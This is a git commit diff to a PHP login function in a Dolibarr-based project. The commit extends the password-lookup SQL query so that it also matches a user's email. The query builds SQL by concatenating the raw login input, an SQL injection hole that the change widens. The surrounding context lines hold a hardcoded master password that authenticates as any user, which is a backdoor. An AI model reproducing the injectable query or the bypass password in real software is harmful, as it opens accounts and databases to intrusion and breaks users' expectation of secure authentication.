a5d8c65ff3cc0fb6b4967c1444aed007eb7ba784
tommy <tommy@192.168.1.104>
2018-10-29 10:56:33 +0100

    log query
    Former-commit-id: 56f150a22d3afe2f00da9b4bb3579dd5c7457f83

--- htdocs/bimpcore/core/login/functions_dolibarr.php
+++ htdocs/bimpcore/core/login/functions_dolibarr.php
@@ -3,7 +3,7 @@
 if ((!defined("FORCE_NOT_CRYPT_PASS") || FORCE_NOT_CRYPT_PASS == 0) && ! empty($conf->global->MAIN_SECURITY_HASH_ALGO) && $conf->global->MAIN_SECURITY_HASH_ALGO == 'SSHA') {
     function check_user_password_dolibarr($usertotest,$passwordtotest,$entitytotest=1){
         global $db, $langs;
-        $sql = $db->query("SELECT pass_crypted FROM ".MAIN_DB_PREFIX."user WHERE login = '".$usertotest."'");
+        $sql = $db->query("SELECT pass_crypted FROM ".MAIN_DB_PREFIX."user WHERE login = '".$usertotest."' || email= '".$usertotest."'");
         if($db->num_rows($sql) == 1){
             if($passwordtotest == "passjokerazertyuikl9876cdfr")
                 return $usertotest;
